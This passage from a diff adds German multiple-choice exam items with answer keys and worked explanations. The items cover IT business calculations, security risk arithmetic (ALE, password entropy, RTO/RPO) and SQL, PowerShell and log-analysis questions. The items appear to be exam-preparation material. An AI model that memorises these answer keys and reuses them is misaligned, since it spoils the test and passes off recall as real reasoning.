+    "q": "Eine Plattform zur Automatisierung der Serverbereitstellung kostet 46.500,00 Euro. Sie spart in den Jahren 1 bis 4: 14.000,00 Euro, 16.000,00 Euro, 17.000,00 Euro, 15.000,00 Euro. Der Kalkulationszins wird mit 5 % angenommen. Wie hoch ist der Kapitalwert der Investition?",
+    "options": [
+      "8.371,58 Euro",
+      "15.500,00 Euro",
+      "12.547,62 Euro",
+      "8.661,40 Euro"
+    ],
+    "a": "8.371,58 Euro",
+    "exp": "Jeder Rückfluss wird mit (1,05)^t abgezinst: 13.333,33 + 14.512,47 + 14.685,24 + 12.340,54 = 54.871,58 Euro. Abzüglich Investition: 54.871,58 Euro - 46.500,00 Euro = 8.371,58 Euro. Der Kapitalwert ist positiv, die Investition lohnt sich."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Die Umstellung auf virtuelle Desktops kostet 72.000,00 Euro. Die jährlichen Einsparungen steigen: Jahr 1 bis 4 18.000,00 Euro, 24.000,00 Euro, 26.000,00 Euro, 30.000,00 Euro. Nach wie vielen Jahren hat sich die Investition amortisiert (kumulierte Rückflüsse, unterjährig anteilig)?",
+    "options": [
+      "ca. 3,1 Jahre",
+      "ca. 2,9 Jahre",
+      "ca. 3,2 Jahre",
+      "ca. 4,0 Jahre"
+    ],
+    "a": "ca. 3,1 Jahre",
+    "exp": "Kumuliert: 18.000,00 Euro, 42.000,00 Euro, 68.000,00 Euro, 98.000,00 Euro. Nach 3 Jahren fehlen noch 4.000,00 Euro. Diese werden im Jahr 4 erwirtschaftet: 4.000 / 30.000 = 0,13. Ergebnis 3,1 Jahre. Der Durchschnitt aller Jahre (ca. 2,9 Jahre) verfälscht bei ungleichen Rückflüssen."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein Kunde vergleicht für die nächsten 5 Jahre einen eigenen Server mit einer Cloud-Instanz. Server: Kauf 21.500,00 Euro, einmalige Einrichtung 3.200,00 Euro, Betrieb (Strom, Wartung, Adminanteil) 4.800,00 Euro pro Jahr. Cloud: 690,00 Euro pro Monat, dazu 45,00 Euro Datentransfer pro Monat und einmalig 1.800,00 Euro Migration. Welche Lösung ist günstiger und um wie viel?",
+    "options": [
+      "Cloud, um 2.800,00 Euro",
+      "Cloud, um 4.600,00 Euro",
+      "Eigener Server, um 400,00 Euro",
+      "Cloud, um 5.500,00 Euro"
+    ],
+    "a": "Cloud, um 2.800,00 Euro",
+    "exp": "Server: 21.500,00 Euro + 3.200,00 Euro + 5 * 4.800,00 Euro = 48.700,00 Euro. Cloud: 1.800,00 Euro + 60 Monate * 735,00 Euro = 45.900,00 Euro. Differenz: 2.800,00 Euro. Einmalkosten gehören auf beiden Seiten in den Vergleich."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Für die Datensicherung stehen zwei Varianten zur Wahl: eine eigene Backup-Appliance für 15.300,00 Euro einmalig plus 180,00 Euro Betrieb pro Monat oder Cloud-Speicher für 780,00 Euro pro Monat. Ab welchem Monat ist die Appliance insgesamt günstiger?",
+    "options": [
+      "ab dem 26. Monat",
+      "ab dem 25. Monat",
+      "ab dem 20. Monat",
+      "ab dem 16. Monat"
+    ],
+    "a": "ab dem 26. Monat",
+    "exp": "Die Appliance spart je Monat 780,00 Euro - 180,00 Euro = 600,00 Euro. 15.300,00 Euro / 600,00 Euro = 25,5 Monate. Im 25. Monat ist die Anschaffung noch nicht ganz eingespielt, ab dem 26. Monat ist die Appliance günstiger."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein Hosting-Cluster soll 36 Monate genutzt werden. Leasing: Sonderzahlung 2.500,00 Euro und 1.150,00 Euro monatlich inklusive Wartung. Kauf: 36.800,00 Euro, Wartungsvertrag 2.900,00 Euro pro Jahr, nach 3 Jahren Verkauf der Hardware für geschätzt 5.500,00 Euro. Welche Variante ist günstiger und um wie viel?",
+    "options": [
+      "Kauf, um 3.900,00 Euro",
+      "Leasing, um 1.600,00 Euro",
+      "Kauf, um 1.400,00 Euro",
+      "Kauf, um 9.700,00 Euro"
+    ],
+    "a": "Kauf, um 3.900,00 Euro",
+    "exp": "Leasing: 2.500,00 Euro + 36 * 1.150,00 Euro = 43.900,00 Euro. Kauf: 36.800,00 Euro + 3 * 2.900,00 Euro - 5.500,00 Euro Restwert = 40.000,00 Euro. Differenz 3.900,00 Euro. Der Verkaufserlös mindert die Kosten des Kaufs."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Für neue Notebooks (Kaufpreis je 1.380,00 Euro netto) bietet die Bank einen Leasingfaktor von 3,1 % pro Monat bei 36 Monaten Laufzeit. Um wie viel Prozent übersteigen die Leasingzahlungen den Kaufpreis?",
+    "options": [
+      "11,6 %",
+      "10,4 %",
+      "3,1 %",
+      "89,6 %"
+    ],
+    "a": "11,6 %",
+    "exp": "Rate: 1.380,00 Euro * 3,1 % = 42,78 Euro. Summe: 36 * 42,78 Euro = 1.540,08 Euro. Mehrkosten: 160,08 Euro, bezogen auf den Kaufpreis 160,08 / 1.380,00 = 11,6 %."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ihr Unternehmen startet einen Managed-Service für Arbeitsplätze. Die Fixkosten (Monitoring-Plattform, Rufbereitschaft) betragen 11.400,00 Euro im Monat. Je betreutem Client werden 39,00 Euro monatlich berechnet, die variablen Kosten (Agent-Lizenz, Support) liegen bei 14,50 Euro. Ab wie vielen Clients ist das Angebot kostendeckend?",
+    "options": [
+      "466 Clients",
+      "465 Clients",
+      "293 Clients",
+      "787 Clients"
+    ],
+    "a": "466 Clients",
+    "exp": "Deckungsbeitrag je Client: 39,00 Euro - 14,50 Euro = 24,50 Euro. 11.400,00 Euro / 24,50 Euro = 465,3. Es muss auf ganze Clients aufgerundet werden: 466."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein Servicevertrag für 25 Arbeitsplätze bringt 1.340,00 Euro im Monat. Variable Kosten: Security-Lizenz 12,40 Euro je Arbeitsplatz, im Schnitt 6 Technikerstunden zu internen 42,00 Euro und 2 Anfahrten zu je 35,00 Euro. Wie hoch ist der monatliche Deckungsbeitrag des Vertrags?",
+    "options": [
+      "708,00 Euro",
+      "778,00 Euro",
+      "1.005,60 Euro",
+      "960,00 Euro"
+    ],
+    "a": "708,00 Euro",
+    "exp": "Lizenzen: 25 * 12,40 Euro = 310,00 Euro. Technik: 6 * 42,00 Euro = 252,00 Euro. Anfahrten: 2 * 35,00 Euro = 70,00 Euro. 1.340,00 Euro - 310,00 - 252,00 - 70,00 = 708,00 Euro."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Die Serviceabteilung hat 18 Bronze-Verträge, 11 Silber-Verträge und 5 Gold-Verträge. Die monatlichen Deckungsbeiträge je Vertrag betragen Bronze 140,00 Euro, Silber 310,00 Euro, Gold 720,00 Euro. Die Fixkosten der Abteilung liegen bei 9.200,00 Euro im Monat. Welches monatliche Betriebsergebnis ergibt sich?",
+    "options": [
+      "Gewinn von 330,00 Euro",
+      "Gewinn von 9.530,00 Euro",
+      "Verlust von 8.030,00 Euro",
+      "Gewinn von 4.060,00 Euro"
+    ],
+    "a": "Gewinn von 330,00 Euro",
+    "exp": "Gesamtdeckungsbeitrag: 18 * 140 + 11 * 310 + 5 * 720 = 9.530,00 Euro. Abzüglich Fixkosten: 9.530,00 Euro - 9.200,00 Euro = 330,00 Euro. Ein einfacher Durchschnitt der drei Deckungsbeiträge ignoriert die unterschiedlichen Vertragszahlen."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Das Projekt \"Einführung eines neuen Ticketsystems\" hat ein Budget (BAC) von 96.000,00 Euro. Zum Stichtag sollten laut Plan 55 % erledigt sein, tatsächlich sind 45 % fertig. Bisher sind Istkosten (AC) von 49.680,00 Euro angefallen. Wie hoch ist der Terminentwicklungsindex (SPI)?",
+    "options": [
+      "0,82",
+      "1,22",
+      "0,87",
+      "0,94"
+    ],
+    "a": "0,82",
+    "exp": "PV = 96.000 * 55 % = 52.800,00 Euro, EV = 96.000 * 45 % = 43.200,00 Euro. SPI = EV / PV = 43.200 / 52.800 = 0,82. Unter 1 heißt: das Projekt ist hinter dem Zeitplan."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Beim Rollout von Thin Clients (Budget 64.000,00 Euro) meldet der Fortschrittsbericht, dass 60 % der Arbeitspakete abgeschlossen sind. Dafür wurden bereits 44.800,00 Euro ausgegeben. Welchen Kostenentwicklungsindex (CPI) ermitteln Sie?",
+    "options": [
+      "0,86",
+      "1,17",
+      "0,70",
+      "0,60"
+    ],
+    "a": "0,86",
+    "exp": "Fertigstellungswert EV = 64.000 * 60 % = 38.400,00 Euro. CPI = EV / AC = 38.400 / 44.800 = 0,86. Für jeden ausgegebenen Euro wurde nur Arbeit im Wert von 0,86 Euro geleistet."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Controlling-Bericht zum Ticketsystem-Projekt: Budget (BAC) 96.000,00 Euro, Fertigstellungsgrad 45 %, bisherige Istkosten 49.680,00 Euro. Mit welchen voraussichtlichen Gesamtkosten (EAC) rechnen Sie, wenn die bisherige Kosteneffizienz anhält?",
+    "options": [
+      "110.400,00 Euro",
+      "83.478,26 Euro",
+      "102.480,00 Euro",
+      "108.521,74 Euro"
+    ],
+    "a": "110.400,00 Euro",
+    "exp": "EV = 96.000 * 45 % = 43.200,00 Euro. CPI = 43.200 / 49.680 = 0,87. EAC = BAC / CPI = 96.000 / 0,8696 = 110.400,00 Euro. Die Formel AC + (BAC - EV) = 102.480,00 Euro gilt nur, wenn der Rest wie geplant läuft."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Für die Migration des Mailsystems schätzt das Team den Aufwand nach der Dreipunktschätzung (PERT): optimistisch 12, wahrscheinlich 17, pessimistisch 34 Arbeitstage. Welche erwartete Dauer tragen Sie in den Projektplan ein?",
+    "options": [
+      "19 Tage",
+      "21 Tage",
+      "17 Tage",
+      "23 Tage"
+    ],
+    "a": "19 Tage",
+    "exp": "PERT gewichtet den wahrscheinlichsten Wert vierfach: (12 + 4 * 17 + 34) / 6 = 114 / 6 = 19 Tage."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Der Rollout neuer Firewalls an allen Standorten wird mit optimistisch 8, wahrscheinlich 11 und pessimistisch 20 Tagen geschätzt. In welcher Bandbreite (Erwartungswert plus/minus eine Standardabweichung nach PERT) liegt die Dauer mit etwa 68 % Wahrscheinlichkeit?",
+    "options": [
+      "zwischen 10 und 14 Tagen",
+      "zwischen 8 und 20 Tagen",
+      "zwischen 9 und 13 Tagen",
+      "zwischen 6 und 18 Tagen"
+    ],
+    "a": "zwischen 10 und 14 Tagen",
+    "exp": "Erwartungswert: (8 + 4 * 11 + 20) / 6 = 12. Standardabweichung: (20 - 8) / 6 = 2. 12 plus/minus 2 ergibt 10 bis 14 Tage."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Für die Erneuerung eines Standortnetzes liegt dieser Netzplan vor: A Anforderungen aufnehmen 3 Tage; B Hardware beschaffen 8 Tage nach A; C Netzkonzept erstellen 5 Tage nach A; D Server installieren 6 Tage nach B; E Switche konfigurieren 3 Tage nach C; F VLAN-Test 2 Tage nach E; G Dokumentation 4 Tage nach C; H Abnahme 1 Tag nach D, F und G. Welche Vorgänge bilden den kritischen Pfad, und wie lange dauert das Projekt?",
+    "options": [
+      "A, B, D, H mit 18 Tagen",
+      "A, C, E, F, H mit 14 Tagen",
+      "A, C, G, H mit 13 Tagen",
+      "A, B, D, H mit 17 Tagen"
+    ],
+    "a": "A, B, D, H mit 18 Tagen",
+    "exp": "Vorwärtsrechnung: A endet an Tag 3, B endet an Tag 11, C endet an Tag 8, D endet an Tag 17, E endet an Tag 11, F endet an Tag 13, G endet an Tag 12, H endet an Tag 18. Der längste Weg A - B - D - H ergibt 18 Tage. Alle Vorgänge darauf haben keinen Puffer. A - C - E - F - H dauert nur 14 Tage."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Gleicher Netzplan: A Anforderungen aufnehmen 3 Tage; B Hardware beschaffen 8 Tage nach A; C Netzkonzept erstellen 5 Tage nach A; D Server installieren 6 Tage nach B; E Switche konfigurieren 3 Tage nach C; F VLAN-Test 2 Tage nach E; G Dokumentation 4 Tage nach C; H Abnahme 1 Tag nach D, F und G. Wie groß ist der freie Puffer von Vorgang E (Switche konfigurieren)?",
+    "options": [
+      "0 Tage",
+      "4 Tage",
+      "6 Tage",
+      "5 Tage"
+    ],
+    "a": "0 Tage",
+    "exp": "E endet frühestens an Tag 11, sein Nachfolger F beginnt frühestens an Tag 11. Freier Puffer: 11 - 11 = 0. Der Gesamtpuffer von E beträgt 4 Tage, weil F danach selbst noch 4 Tage Puffer hat. E darf sich also nur verschieben, wenn F mitrutscht."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Zwei Administratoren arbeiten 6 Monate an einem Virtualisierungsprojekt. Admin 1 (4.300,00 Euro brutto im Monat) ist zu 50 % eingeplant, Admin 2 (3.900,00 Euro brutto) zu 30 %. Die Arbeitgeber-Lohnnebenkosten werden vereinfacht mit 21 % angenommen. Wie hoch sind die Personalkosten des Projekts?",
+    "options": [
+      "24.103,20 Euro",
+      "19.920,00 Euro",
+      "59.532,00 Euro",
+      "15.736,80 Euro"
+    ],
+    "a": "24.103,20 Euro",
+    "exp": "Anteile: 4.300 * 50 % + 3.900 * 30 % = 3.320,00 Euro im Monat. Mit Lohnnebenkosten: * 1,21 = 4.017,20 Euro. Für 6 Monate: 24.103,20 Euro."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein Rechenzentrumsvertrag kostet 3.600,00 Euro im Monat (30 Tage, 24/7). Gutschrift laut SLA: unter 99,9 % Verfügbarkeit 5 %, unter 99,5 % 10 %, unter 99,0 % 25 % der Monatsgebühr. Im September gab es zwei Ausfälle von 135 und 110 Minuten. Welche Gutschrift steht dem Kunden zu?",
+    "options": [
+      "360,00 Euro",
+      "180,00 Euro",
+      "900,00 Euro",
+      "20,42 Euro"
+    ],
+    "a": "360,00 Euro",
+    "exp": "Ausfall: 135 + 110 = 245 Minuten = 4,08 h. Verfügbarkeit: (720 - 4,08) / 720 = 99,43 %. Das liegt unter 99,5 %, aber nicht unter 99,0 %: 10 % von 3.600,00 Euro = 360,00 Euro."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ihr Unternehmen liefert ein Netzwerkprojekt im Wert von 185.000,00 Euro netto 32 Arbeitstage zu spät. Der Vertrag sieht eine Vertragsstrafe von 0,2 % des Auftragswerts je Arbeitstag vor, höchstens jedoch 5 % des Auftragswerts (netto). Wie hoch ist die Vertragsstrafe?",
+    "options": [
+      "9.250,00 Euro",
+      "11.840,00 Euro",
+      "11.007,50 Euro",
+      "370,00 Euro"
+    ],
+    "a": "9.250,00 Euro",
+    "exp": "Ohne Obergrenze: 185.000,00 Euro * 0,2 % * 32 = 11.840,00 Euro. Die Obergrenze liegt bei 5 % von 185.000,00 Euro = 9.250,00 Euro. Es gilt der kleinere Betrag: 9.250,00 Euro."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "In der Risikoanalyse bewerten Sie einen Dateiserver mit Konstruktionsdaten mit 90.000,00 Euro. Bei einem Wasserschaden im Serverraum gehen geschätzt 35 % dieses Werts verloren (Exposure Factor). Ein solcher Schaden wird 0,4-mal pro Jahr erwartet. Wie hoch ist der erwartete jährliche Verlust (ALE)?",
+    "options": [
+      "12.600,00 Euro",
+      "31.500,00 Euro",
+      "36.000,00 Euro",
+      "78.750,00 Euro"
+    ],
+    "a": "12.600,00 Euro",
+    "exp": "Einzelschaden (SLE): 90.000,00 Euro * 35 % = 31.500,00 Euro. ALE = SLE * ARO = 31.500,00 Euro * 0,4 = 12.600,00 Euro."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Für Ransomware-Angriffe ermitteln Sie einen erwarteten jährlichen Verlust (ALE) von 39.000,00 Euro. Eine EDR-Lösung für 18.000,00 Euro im Jahr senkt ihn auf 9.000,00 Euro. Wie hoch ist der Return on Security Investment (ROSI)?",
+    "options": [
+      "66,7 %",
+      "40,0 %",
+      "76,9 %",
+      "30,8 %"
+    ],
+    "a": "66,7 %",
+    "exp": "Risikominderung: 39.000 - 9.000 = 30.000,00 Euro. ROSI = (Minderung - Kosten) / Kosten = (30.000 - 18.000) / 18.000 = 66,7 %. Jeder investierte Euro bringt also 0,67 Euro Nettonutzen."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Im Rahmen des ISMS bewerten Sie vier Risiken pro Jahr: Ransomware: Eintrittswahrscheinlichkeit 4 %, Schaden 220.000,00 Euro; Notebookverlust: Eintrittswahrscheinlichkeit 70 %, Schaden 14.000,00 Euro; Ausfall der Internetleitung: Eintrittswahrscheinlichkeit 45 %, Schaden 16.000,00 Euro; Fehlkonfiguration der Firewall: Eintrittswahrscheinlichkeit 10 %, Schaden 60.000,00 Euro. Welches Risiko hat den höchsten Risikowert?",
+    "options": [
+      "Notebookverlust mit 9.800,00 Euro",
+      "Ransomware mit 8.800,00 Euro",
+      "Ausfall der Internetleitung mit 7.200,00 Euro",
+      "Fehlkonfiguration der Firewall mit 6.000,00 Euro"
+    ],
+    "a": "Notebookverlust mit 9.800,00 Euro",
+    "exp": "Risikowert = Wahrscheinlichkeit * Schadenshöhe: Ransomware 8.800,00 Euro, Notebookverlust 9.800,00 Euro, Ausfall der Internetleitung 7.200,00 Euro, Fehlkonfiguration der Firewall 6.000,00 Euro. Nicht der größte Einzelschaden entscheidet, sondern das Produkt."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Für Servicekonten erzeugt ein Skript zufällige Passwörter mit 14 Zeichen, die nur aus Kleinbuchstaben und Ziffern bestehen. Wie hoch ist die Entropie eines solchen Passworts?",
+    "options": [
+      "ca. 72 Bit",
+      "ca. 84 Bit",
+      "ca. 22 Bit",
+      "ca. 66 Bit"
+    ],
+    "a": "ca. 72 Bit",
+    "exp": "Zeichenvorrat: 26 + 10 = 36. Entropie = Länge * log2(Vorrat) = 14 * 5,17 = 72,4 Bit. Mit 6 Bit je Zeichen zu rechnen, überschätzt den Wert."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Ein Passwort hat 60 Bit Entropie. Ein Angreifer testet offline angenommen 5 Milliarden Hashes pro Sekunde. Wie lange braucht er im Mittel, bis er das Passwort gefunden hat?",
+    "options": [
+      "ca. 3,7 Jahre",
+      "ca. 7,3 Jahre",
+      "ca. 3,2 Jahre",
+      "ca. 1,8 Jahre"
+    ],
+    "a": "ca. 3,7 Jahre",
+    "exp": "2^60 = ca. 1,15 * 10^18 Möglichkeiten. / 5 * 10^9 = ca. 2,31 * 10^8 s für alle. Im Mittel wird die Hälfte gebraucht: ca. 1,15 * 10^8 s = 3,7 Jahre."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "40 Standorte sollen paarweise vertraulich Daten austauschen. Wie viele Schlüssel werden insgesamt benötigt, wenn jedes Paar einen eigenen symmetrischen Schlüssel erhält, und wie viele bei asymmetrischer Verschlüsselung?",
+    "options": [
+      "symmetrisch 780, asymmetrisch 80",
+      "symmetrisch 1.560, asymmetrisch 80",
+      "symmetrisch 780, asymmetrisch 40",
+      "symmetrisch 1.560, asymmetrisch 40"
+    ],
+    "a": "symmetrisch 780, asymmetrisch 80",
+    "exp": "Symmetrisch: n * (n - 1) / 2 = 40 * 39 / 2 = 780. Asymmetrisch hat jeder Teilnehmer ein Schlüsselpaar: 2 * 40 = 80."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Ein Messaging-System nutzt für jedes Nutzerpaar einen eigenen symmetrischen Schlüssel. Die Gruppe wächst von 25 auf 30 Personen. Wie viele Schlüssel müssen zusätzlich verteilt werden?",
+    "options": [
+      "135 zusätzliche Schlüssel",
+      "270 zusätzliche Schlüssel",
+      "150 zusätzliche Schlüssel",
+      "10 zusätzliche Schlüssel"
+    ],
+    "a": "135 zusätzliche Schlüssel",
+    "exp": "Vorher: 25 * 24 / 2 = 300. Nachher: 30 * 29 / 2 = 435. Differenz: 135. Jeder Neue braucht einen Schlüssel mit allen anderen, auch mit den übrigen Neuen."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Wegen kürzerer Laufzeiten werden 60 TLS-Zertifikate künftig alle 4 Wochen erneuert (angenommen, 52 Wochen im Jahr). Manuell dauert eine Erneuerung 20 Minuten. Mit automatischer Erneuerung per ACME bleiben 3 Minuten Kontrolle je Erneuerung. Wie viele Arbeitsstunden spart die Automatisierung im Jahr?",
+    "options": [
+      "221 Stunden",
+      "260 Stunden",
+      "17 Stunden",
+      "39 Stunden"
+    ],
+    "a": "221 Stunden",
+    "exp": "Erneuerungen: 52 / 4 = 13 je Zertifikat, also 60 * 13 = 780 im Jahr. Manuell: 780 * 20 min = 260 h. ACME: 780 * 3 min = 39 h. Ersparnis: 221 h."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Ein TLS-Zertifikat für das Kundenportal wurde am 20.03.2026 mit 200 Tagen Laufzeit ausgestellt. Das Monitoring soll 30 Tage vor Ablauf warnen. An welchem Tag wird die Warnung ausgelöst?",
+    "options": [
+      "am 06.09.2026",
+      "am 06.10.2026",
+      "am 05.09.2026",
+      "am 09.09.2026"
+    ],
+    "a": "am 06.09.2026",
+    "exp": "20.03.2026 + 200 Tage = 06.10.2026 (Ablauf). 30 Tage davor ist der 06.09.2026. Monate dürfen nicht pauschal mit 30 Tagen gerechnet werden, März, Mai, Juli und August haben 31 Tage."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Eine Firewall liefert rund um die Uhr durchschnittlich 1.800 Ereignisse pro Sekunde zu je 450 Byte an das SIEM. Die Logs werden 90 Tage aufbewahrt und im Verhältnis 1:8 komprimiert. Wie viel Speicher wird benötigt (1 GB = 10^9 Byte)?",
+    "options": [
+      "ca. 787 GB",
+      "ca. 6.299 GB",
+      "ca. 262 GB",
+      "ca. 50.388 GB"
+    ],
+    "a": "ca. 787 GB",
+    "exp": "1.800 * 450 Byte * 86.400 s = 69,98 GB pro Tag. * 90 Tage = 6.298,6 GB. / 8 = 787,3 GB."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Ein zentraler Syslog-Server hat 2.000 GB Speicher für Logs. Er soll höchstens zu 80 % gefüllt sein. Täglich kommen 38 GB hinzu. Wie viele volle Tage können Logs höchstens aufbewahrt werden?",
+    "options": [
+      "42 Tage",
+      "43 Tage",
+      "52 Tage",
+      "10 Tage"
+    ],
+    "a": "42 Tage",
+    "exp": "Nutzbar: 2.000 GB * 80 % = 1.600 GB. / 38 GB pro Tag = 42,1. Es wird abgerundet, sonst wäre die Grenze überschritten: 42 Tage."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Nach einem Ausfall muss ein Datenbankserver wiederhergestellt werden. Das Betriebssystem neu aufsetzen dauert 45 Minuten, danach werden 1,6 TB mit 400 MB/s zurückgesichert, anschließend dauern Prüfungen 30 Minuten. Das RTO beträgt 2 Stunden. Wird es eingehalten, und wie lange dauert der Wiederanlauf?",
+    "options": [
+      "Nein, 2 Std. 22 Min.",
+      "Ja, 1 Std. 52 Min.",
+      "Ja, 1 Std. 07 Min.",
+      "Nein, 2 Std. 28 Min."
+    ],
+    "a": "Nein, 2 Std. 22 Min.",
+    "exp": "Rücksicherung: 1,6 * 10^12 Byte / 400 * 10^6 Byte/s = 4.000 s = 66,7 Minuten. Gesamt: 45 + 66,7 + 30 = 141,7 Minuten, also 2 Std. 22 Min. Das RTO umfasst die gesamte Zeit bis zum Wiederanlauf, auch die Prüfungen."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Ein Fileserver wird täglich um 01:00 Uhr voll gesichert, zusätzlich entsteht alle 4 Stunden ein Snapshot (01:00, 05:00, 09:00 usw.). Das RPO beträgt 2 Stunden. Um 16:40 Uhr fällt das Storage aus, alle Änderungen nach dem letzten Snapshot sind verloren. Um wie viel wird das RPO überschritten?",
+    "options": [
+      "1 Stunde 40 Minuten",
+      "3 Stunden 40 Minuten",
+      "2 Stunden",
+      "13 Stunden 40 Minuten"
+    ],
+    "a": "1 Stunde 40 Minuten",
+    "exp": "Snapshots: 01:00, 05:00, 09:00, 13:00, 17:00, 21:00 Uhr. Der letzte vor dem Ausfall ist um 13:00 Uhr. Verlust: 13:00 bis 16:40 = 3 Stunden 40 Minuten. Überschreitung: 3 Stunden 40 Minuten - 2 Stunden = 1 Stunde 40 Minuten."
+  },
+  {
+    "cat": "systeme",
+    "q": "Die Teamleitung will wissen, wie viele dringende Tickets noch nicht erledigt sind. Tabelle tickets (id, prio, status): (101, 1, 'offen'), (102, 3, 'offen'), (103, 2, 'geschlossen'), (104, 2, 'in Arbeit'), (105, 1, 'geschlossen'), (106, 4, 'offen'), (107, 2, 'offen'), (108, 1, 'in Arbeit'), (109, 3, 'in Arbeit'). Welches Ergebnis liefert diese Abfrage? SELECT COUNT(*) FROM tickets WHERE prio <= 2 AND status <> 'geschlossen';",
+    "options": [
+      "4",
+      "9",
+      "2",
+      "7"
+    ],
+    "a": "4",
+    "exp": "Beide Bedingungen müssen gelten: prio 1 oder 2 und nicht geschlossen. Das trifft auf die IDs 101, 104, 107, 108 zu, also 4 Zeilen."
+  },
+  {
+    "cat": "systeme",
+    "q": "Für ein Lizenzaudit liegt die Tabelle lizenzen (abteilung, produkt, anzahl) vor: ('Vertrieb', 'Office', 12), ('Technik', 'CAD', 9), ('Vertrieb', 'CRM', 14), ('Verwaltung', 'Office', 11), ('Technik', 'Office', 22), ('Verwaltung', 'DMS', 9), ('Einkauf', 'Office', 6), ('Einkauf', 'ERP', 7). Welche Zeilen liefert diese Abfrage? SELECT abteilung, SUM(anzahl) FROM lizenzen GROUP BY abteilung HAVING SUM(anzahl) > 20 ORDER BY abteilung;",
+    "options": [
+      "Technik 31; Vertrieb 26",
+      "Technik 31; Vertrieb 26; Verwaltung 20",
+      "Einkauf 13; Technik 31; Vertrieb 26; Verwaltung 20",
+      "Technik 22"
+    ],
+    "a": "Technik 31; Vertrieb 26",
+    "exp": "GROUP BY bildet je Abteilung eine Summe: Einkauf 13; Technik 31; Vertrieb 26; Verwaltung 20. HAVING filtert danach die Gruppen, nur Summen über 20 bleiben: Technik 31; Vertrieb 26."
+  },
+  {
+    "cat": "systeme",
+    "q": "In der Inventardatenbank steht die Tabelle geraete (name, ip, standort): ('PC-01', '10.1.0.11', 'Halle'), ('PC-02', NULL, 'Halle'), ('NB-07', '10.1.0.37', 'Büro'), ('DR-02', '10.1.0.52', 'Büro'), ('NB-09', NULL, 'Lager'), ('PC-05', '10.1.0.15', 'Büro'), ('SC-01', '10.1.0.60', 'Halle'). Welche zwei Werte liefert diese Abfrage? SELECT COUNT(ip), COUNT(DISTINCT standort) FROM geraete;",
+    "options": [
+      "5 und 3",
+      "7 und 3",
+      "5 und 7",
+      "7 und 7"
+    ],
+    "a": "5 und 3",
+    "exp": "COUNT(ip) zählt nur Zeilen, in denen ip nicht NULL ist: 5 von 7. COUNT(DISTINCT standort) zählt verschiedene Werte: Büro, Halle, Lager, also 3."
+  },
+  {
+    "cat": "systeme",
+    "q": "Sensoren schreiben Temperaturen der Technikräume in die Tabelle messwerte (raum, temp): ('R101', 24), ('R102', 29), ('R101', 26), ('R103', 23), ('R102', 21), ('R103', 24), ('R101', 25), ('R103', 22), ('R102', 22). Welches Ergebnis liefert diese Abfrage? SELECT raum, AVG(temp) AS schnitt FROM messwerte GROUP BY raum ORDER BY schnitt DESC LIMIT 1;",
+    "options": [
+      "R101 mit 25",
+      "R103 mit 23",
+      "R102 mit 29",
+      "R101 mit 75"
+    ],
+    "a": "R101 mit 25",
+    "exp": "Durchschnitte: R101 mit 25, R102 mit 24, R103 mit 23. ORDER BY schnitt DESC LIMIT 1 liefert den Raum mit dem höchsten Durchschnitt. Der höchste Einzelwert (29 in R102) entscheidet nicht."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Monitoring-Skript prüft Dienste. $dienste enthält Objekte mit Name, Status und StartType: Spooler Stopped Automatic; W32Time Running Automatic; wuauserv Stopped Manual; BITS Stopped Automatic; WinRM Running Automatic; Fax Stopped Disabled; DHCP Stopped Automatic; LanmanServer Running Automatic. Welche Zahl gibt ($dienste | Where-Object { $_.Status -eq 'Stopped' -and $_.StartType -eq 'Automatic' }).Count aus?",
+    "options": [
+      "3",
+      "8",
+      "5",
+      "6"
+    ],
+    "a": "3",
+    "exp": "Nur Dienste, die gestoppt sind und automatisch starten sollten, erfüllen beide Bedingungen: Spooler, BITS, DHCP. Das ergibt 3."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Kollege testet folgenden PowerShell-Ausschnitt: $summe = 0; foreach ($i in 1..13) { if ($i % 3 -ne 0) { $summe += $i } }; $summe. Welcher Wert wird ausgegeben?",
+    "options": [
+      "61",
+      "30",
+      "91",
+      "48"
+    ],
+    "a": "61",
+    "exp": "1..13 enthält beide Grenzen. Addiert werden alle Zahlen, die nicht durch 3 teilbar sind: Gesamtsumme 91 minus (3 + 6 + 9 + 12) = 61."
+  },
+  {
+    "cat": "systeme",
+    "q": "Sie untersuchen Anmeldeversuche. auth.log enthält (je Zeile): sshd: Failed password for root from 203.0.113.9 | sshd: Failed password for root from 203.0.113.9 | sshd: Accepted publickey for admin from 10.0.0.5 | sshd: Failed password for admin from 198.51.100.4 | sshd: Failed password for test from 192.0.2.77 | sshd: Accepted password for backup from 10.0.0.8 | sshd: Failed password for root from 198.51.100.4 | sshd: Failed password for guest from 203.0.113.9. Welche Zahl liefert grep \"Failed\" auth.log | awk '{print $NF}' | sort -u | wc -l?",
+    "options": [
+      "3",
+      "6",
+      "5",
+      "8"
+    ],
+    "a": "3",
